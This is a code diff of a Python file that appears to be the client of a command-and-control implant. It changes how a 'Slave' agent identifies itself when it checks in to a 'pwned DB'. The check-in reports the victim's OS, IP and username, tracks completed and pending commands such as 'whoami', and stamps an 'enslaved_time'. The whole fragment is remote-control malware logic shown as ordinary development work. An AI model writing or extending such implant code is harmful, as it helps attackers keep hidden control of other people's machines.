@@ -7,6 +7,7 @@ import subprocess
 import os
 from time import sleep
 import sys
+import random
 
 class Json_Format(BaseModel):
     agent_id: int
@@ -15,7 +16,6 @@ class Json_Format(BaseModel):
     user: str
     completed_commands: list
     pending_commands:list
-
     enslaved_time: datetime
 
 class Slave(object):
@@ -49,7 +49,8 @@ class Slave(object):
                 print("Connected to pwned DB...Ready to send initial check in")
 
     def initial_check_in(self):
-        self.init_checkin = Json_Format(agent_id=123, OS=self.os, ip=self.ip, user=self.user, completed_commands=["initial_check_in"], pending_commands=["whoami"], enslaved_time=datetime.now())
+        random_num = random.randint(10000,90000)
+        self.init_checkin = Json_Format(agent_id=random_num, OS=self.os, ip=self.ip, user=self.user, completed_commands=["initial_check_in"], pending_commands=["whoami"], enslaved_time=datetime.now())
         self.init_checkin = jsonable_encoder(self.init_checkin)
         print(self.init_checkin)
         print(type(self.init_checkin))
